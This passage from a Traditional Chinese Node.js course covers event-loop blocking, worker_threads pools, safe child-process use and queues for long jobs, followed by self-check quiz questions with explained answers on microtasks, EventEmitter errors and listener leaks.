  • 移交大量二進位資料：真的要傳大量二進位資料（例如圖片）時，可以把 ArrayBuffer 放進第二個參數 postMessage(data, [buffer]) 移交（transfer）：所有權直接交給 worker，不用複製，但主執行緒這邊就不能再用它了。
  • 子程序的輸出上限：execFile／exec 的輸出超過 maxBuffer（預設 1MB）時子程序會被終止，大輸出改用 spawn 讀 stream。
  • Permission Model：第 25 課的 Permission Model 開啟時，開 worker 要加 --allow-worker，開子程序要加 --allow-child-process。

小結

  • 每日報表卡住所有客人，是因為 JavaScript 只在一條執行緒上跑，CPU 密集的同步計算會阻塞它，期間新的請求和計時器都進不來。I/O 密集的工作在等待時會交出執行緒，不會這樣。
  • 證明是 event loop 被卡住：monitorEventLoopDelay 量計時器晚了多久（看 max 和 p99），eventLoopUtilization 量執行緒有多忙。等資料庫不會讓延遲升高。
  • 除了自己寫的迴圈，*Sync API、超大 JSON、災難性回溯的正規表示式（ReDoS）也會卡住；啟動階段可以同步，處理請求的路徑上不行。
  • 分段處理：切成每段幾毫秒，每段之間 await setImmediate；async 和 microtask 都不會讓出。只用一顆 CPU。
  • worker_threads：另一條執行緒、另一份記憶體，資料用結構化複製傳遞，所以只傳小的資料。用固定大小的 pool：重複使用、排隊、用 id 對應結果、聽 error／exit 並補 worker、terminate() 收尾。
  • 子程序：execFile／spawn 加參數陣列，不經過 shell，避免 shell 注入；一定要設逾時、檢查結束碼、保留 stderr。
  • 選擇：先量，先少算，再選最簡單能解決的；長時間、要重試、不能遺失的工作交給佇列。

下一課回到最常見的 I/O：讀寫檔案。相對路徑從哪裡算、讀檔失敗怎麼分辨原因、怎麼寫檔才不會讓別人讀到半份 JSON，以及兩筆訂單同時存檔時怎麼不掉資料。

階段檢核：面試會問的觀念

這個階段一定要講得出來的 7 件事。先在心裡回答，再選。

練習 7：尖峰時段登入（非同步的 crypto.pbkdf2）變慢，同時讀菜單檔案（fs.promises.readFile）也變慢；但 /health 正常，event loop 延遲的 p99 只有幾毫秒。最可能的原因是？

✓ 非同步的 pbkdf2、檔案讀寫、dns.lookup 都交給 thread pool，網路收發交給作業系統，所以 /health 不受影響。先量出是不是 pool 在排隊，再決定要不要在啟動設定調 UV_THREADPOOL_SIZE；CPU 核心不多時，雜湊不會因此變快。a 錯在 JavaScript 執行緒被佔住時，/health 會一起慢、event loop 延遲也會很高。（第 7 課）

練習 8：客服回報「整個網站偶爾全部卡 1～2 秒，連 /health 也一樣」。監控上同一時間 event loop 延遲的 max 衝到 1800ms，ELU 接近 100%。先查什麼？

✓ event loop 延遲是計時器實際晚了多久；衝到秒級、ELU 又是滿的，代表 JavaScript 執行緒被同步的工作佔住，所有請求一起等。找到後依情況分段、搬到 worker，或先少算。b 錯在等資料庫是 I/O，等待時 event loop 照樣在處理別的請求，只有那支 API 慢，延遲不會升高。（第 9 課）

練習 9：重算 40 萬筆訂單的集點，同事已經分段了，/menu 卻還是在重算期間完全沒有回應。哪裡出事？

async function rebuildPoints(orders) {
  for (let i = 0; i < orders.length; i += 5_000) {
    orders.slice(i, i + 5_000).forEach(addPoints)
    await Promise.resolve()   // 讓其他請求插進來
  }
}

✓ microtask 在離開目前這段 callback 前全部跑完，event loop 到不了 poll，計時器和請求都輪不到。分段之間要 await 一次 node:timers/promises 的 setImmediate，等它時 event loop 會走完一圈。a 錯在段切得再小，只要讓出用的是 microtask，迴圈一樣不會停下來。（第 7、9 課）

練習 10：每天凌晨的對帳腳本印出「對帳完成」後一直不結束，排程最後判它逾時。同事在最後一行補上 process.exit(0)。怎麼回應？

✓ 程序在沒有 ref 的 handle 時才結束；印完不結束，多半是資料庫連線池或 Redis 連線還開著。關掉它讓程式自然結束，要回報失敗就設 process.exitCode。b 錯在等 1 秒只是猜輸出寫完了，硬砍的問題還在，該關的連線也照樣沒人關。（第 7 課）

練習 11：集點服務逾時的那天，程序以結束碼 1 結束，log 裡卻沒有 catch 記下的錯誤。為什麼？

board.on('paid', async (order) => {
  await points.add(order.customerId)   // 集點服務偶爾逾時
})

try {
  board.emit('paid', order)
} catch (err) {
  log.error(err)
}

✓ try/catch 只接得到監聽器同步 throw 的錯誤；async 監聽器的 rejection 發生在 emit 回傳之後，沒人等它，Node 24 預設以結束碼 1 結束。在監聽器裡 try/catch，或建立 emitter 時傳 captureRejections: true 並掛 error 監聽器。c 錯在 emit 是同步的，監聽器當場就開始執行，跑到第一個 await 才回到 emit。（第 8 課）

練習 12：上線一週後，log 開始出現 MaxListenersExceededWarning: … 11 ready listeners added，記憶體也慢慢漲。哪裡出事？

function waitForReady(board, id, { signal, timeoutMs }) {
  return new Promise((resolve, reject) => {
    const onReady = (o) => { if (o.id === id) resolve(o) }
    board.on('ready', onReady)
    setTimeout(() => reject(new Error('逾時')), timeoutMs)
    signal.addEventListener('abort', () => reject(signal.reason))
  })
}

✓ 三種結局都要走同一個 cleanup：board.off('ready', onReady)、移除 abort 監聽器、clearTimeout，再 resolve 或 reject；這段還少了開頭的 signal.aborted 檢查。警告是洩漏的線索，用 --trace-warnings 找來源，不要只調高上限。b 錯在警告不會擋住任何東西，第 11、12 個監聽器照樣加得上去。（第 8 課）

練習 13：月底結算要算 3～5 分鐘，算完寄 email 給店長；部署或當掉時不能就這樣不見，失敗要能重試。用哪一種做法？

✓ 跑好幾分鐘、失敗要重試、不能因為重啟而遺失的工作，交給佇列和獨立的工作程序，結果再非同步通知。a 錯在 worker 只解決 CPU 卡住的問題，工作還活在這個程序裡：部署或當掉時算到一半就沒了，也沒有重試。（第 9 課）
